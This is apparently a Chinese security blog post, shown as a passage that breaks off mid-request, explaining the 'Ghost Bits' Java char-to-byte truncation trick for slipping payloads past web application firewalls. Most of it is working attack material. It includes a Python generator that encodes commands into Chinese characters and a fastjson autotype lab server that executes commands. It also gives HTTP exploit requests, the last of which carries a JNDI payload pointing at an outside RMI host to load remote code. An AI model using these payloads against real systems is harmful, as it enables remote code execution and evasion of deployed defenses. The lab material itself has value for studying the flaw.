---
title: WAF绕过新姿势实战怎么用？
url: https://mp.weixin.qq.com/s/-P7TTKtKqhdpF-A7M0prVg
source: Doonsec's feed
date: 2026-04-30
fetch_date: 2026-05-01T05:35:55.418238
---

# WAF绕过新姿势实战怎么用？

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ULOszTo2RiaAUj6HiaSlFECAZyuzf4SJCSx6lYh8OQm9t4wgprNGKWK68ztLTibWWkpGHbbFBthvVkZT3xc0VPfnmPhG5Sx1icRPMGPiaCWhichWk/0?wx_fmt=jpeg)

# WAF绕过新姿势实战怎么用？

IceCliffs
IceCliffs

Gh0xE9

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

接着水一篇，这两个都是最近比较有意思的漏洞，一个是应用层的，一个是系统层的，咱们一个一个来

## Ghost Bits

这个中文叫做幽灵比特位，在 Black Hat Asia 2026 被 1ue 和 浅蓝 披露，其原理就是 Java 中 char 转 byte 时高位静默丢弃的底层缺陷，简单来说就是字节转换的问题，在 Java 中 char 为 16 位字节，byte 仅 8 位，如果我们把代码强制转换 (byte) ch 或 ch & 0xfffffff，则高 8 位直接丢失，只保留低 8 位，这脑洞能想出来也是真的牛逼，藏了这么久

攻击者用**Unicode 字符（中文 / 特殊符号）** 绕过 WAF 检测，后端执行时低 8 位还原为危险 ASCII：

* • 陪（U+966A）→ 低 8 位 0x6A → j
* • 阮（U+962E）→ 低 8 位 0x2E → .
* • 瘍（U+760D）→ 低 8 位 0x0D → \r
* • 瘊（U+760A）→ 低 8 位 0x0A → \n

WAF 看到中文，后端执行恶意代码，这就是幽灵比特位的核心，以汉字「爻」（U+2F58）为例：

```
爻  →  U+2F58  →  二进制：00101111 | 00111010
(byte) 转换后：高 8 位 0x2F 丢弃，低 8 位 0x3A → 'X'
```

影响算是特别大吧，很多场景都能 bypass

### 环境实验

笔者这里用的是 fastjson 1.2.83 (开启 autotype) + commons-collections4 (4.0)，这里先打个基本的 calculator

```
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
publicclassBitsTest {
    publicstaticclassCalculator {
        publicCalculator()throws Exception {
            java.lang.Runtime.getRuntime().exec("open -a Calculator.app");
        }
    }
    publicstaticvoidmain(String[] args) {
        ParserConfig.getGlobalInstance().setSafeMode(false);
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        ParserConfig.getGlobalInstance().addAccept("BitsTest");
        Stringpayload="{\"@type\":\"BitsTest$Calculator\"}";
        Objectobj= JSON.parseObject(payload, Object.class);
    }
}
```

这里用某亭的 waf 测测看

![image-20260430165953091](https://mmbiz.qpic.cn/sz_mmbiz_png/ULOszTo2RiaBoBfiaKPic87MxDDmO2zsouK7lIeTebicsURbpXcdsOt4rmfiaFuncaHkI4ibxo3NIgnQOxldIhGIBRiaGz4voHktoGThwcwwGia0PicY/640?wx_fmt=png&from=appmsg "null")

image-20260430165953091

可以发现很容易就被拦了，平时还是得多培养一些钻研精神，如果当时挖的 rce 知道有这种绕过方法就好了，然后来看一下绕过方法，网上都有轮子，随便找个跑一下就行（别被投毒了），或者用我这个精简版的

### exp

```
import urllib.parse
import sys
defget_payload_v2(cmd, base_offset=0x9600):
    ghost_str = "".join(chr(base_offset + ord(c)) for c in cmd)
    url_encoded = urllib.parse.quote(ghost_str.encode('utf-8'))
    unicode_escape = "".join(f"\\u{ord(c):04x}"for c in ghost_str)
    return ghost_str, url_encoded, unicode_escape
defmain():
    target_cmd = sys.argv[1] iflen(sys.argv) > 1else"@type"
    ghost_str, url_payload, uni_payload = get_payload_v2(target_cmd)
    print(target_cmd)
    print(ghost_str)
    print(url_payload)
    print(uni_payload)
if __name__ == "__main__":
    main()
```

### 实战绕过

这就很有意思了，waf 看见的只会认为这是一串合理的中文，完全不知道是一个 payload，所以绕过率还是挺高的，回到刚才那个场景，简单启动一个 http 服务，然后塞入 poc

```
GET /exploit?data=%7B%22癀type%22%3A%22BitsTest%24Calculator%22%7DHTTP/1.1
Host: localhost:8080
sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

实验环境代码如下

```
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.URLDecoder;
import java.util.HashMap;
import java.util.Map;
publicclassBitsTest {
    publicstaticclassCalculator {
        publicCalculator()throws Exception {
            Stringos= System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) {
                Runtime.getRuntime().exec("calc");
            } elseif (os.contains("mac")) {
                Runtime.getRuntime().exec("open -a Calculator.app");
            } else {
                Runtime.getRuntime().exec("xcalc");
            }
        }
    }
    publicstaticvoidmain(String[] args)throws Exception {
        ParserConfig.getGlobalInstance().setSafeMode(false);
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        ParserConfig.getGlobalInstance().addAccept("BitsTest");
        intport=8080;
        HttpServerserver= HttpServer.create(newInetSocketAddress(port), 0);
        server.createContext("/exploit", newDynamicHandler());
        server.setExecutor(null);
        server.start();
    }
    staticclassDynamicHandlerimplementsHttpHandler {
        @Override
        publicvoidhandle(HttpExchange exchange)throws IOException {
            Stringquery= exchange.getRequestURI().getRawQuery();
            Map<String, String> params = parseQuery(query);
            Stringpayload= params.get("data");
            String responseText;
            if (payload != null) {
                try {
                    StringdecodedPayload= URLDecoder.decode(payload, "UTF-8");
                    Objectobj= JSON.parse(decodedPayload);
                    if (obj != null) {
                        responseText = "Success: " + obj.getClass().getName();
                    } else {
                        responseText = "Parsed result is null.";
                    }
                } catch (Exception e) {
                    responseText = "Error: " + e.toString();
                    e.printStackTrace();
                }
            } else {
                responseText = "Usage: ?data={payload}";
            }
            exchange.sendResponseHeaders(200, responseText.getBytes().length);
            OutputStreamos= exchange.getResponseBody();
            os.write(responseText.getBytes());
            os.close();
        }
        private Map<String, String> parseQuery(String query) {
            Map<String, String> result = newHashMap<>();
            if (query == null) return result;
            String[] pairs = query.split("&");
            for (String pair : pairs) {
                intidx= pair.indexOf("=");
                if (idx != -1) {
                    Stringkey= pair.substring(0, idx);
                    Stringvalue= pair.substring(idx + 1);
                    result.put(key, value);
                }
            }
            return result;
        }
    }
}
```

你可以这样子发送

```
GET /exploit?data=%7B%22陀陴陹陰陥%22%3A%22BitsTest%24Calculator%22%7DHTTP/1.1
Host: localhost:8080
sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

![image-20260430183756442](https://mmbiz.qpic.cn/sz_mmbiz_png/ULOszTo2RiaCagibowWOdXtMI1gib1DVGSicOO7Iv9SkNJFNxqbSEiaRHIAlSFG77HNtQtDRQIQ8RGP50ibyPfRSj4jFaNdrfMLvDA88Bc5rxuCibg/640?wx_fmt=png&from=appmsg "null")

image-20260430183756442

还挺好玩的，试试看能不能绕 waf

```
GET /exploit?data=%7B%22%40type%22%3A%22BitsTest%24Calculator%22%2C%20%20%20%22b%22%3A%7B%0D%0A%20%20%20%20%20%20%20%20%22%40type%22%3A%22com%2Esun%2Erowset%2EJdbcRowSetImpl%22%2C%0D%0A%20%20%20%20%20%20%20%20%22dataSourceName%22%3A%22rmi%3A%2F%2Fnmsl%2Ecnm%3A9999%2FExploit%22%2C%0D%0A%20%20%20%20%20%20%20%20%22autoCommit%22%3Atrue%0D%0A%20%20%20%20%7D%7D HTTP/1.1
Host: 192.168.50.88:13232
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac...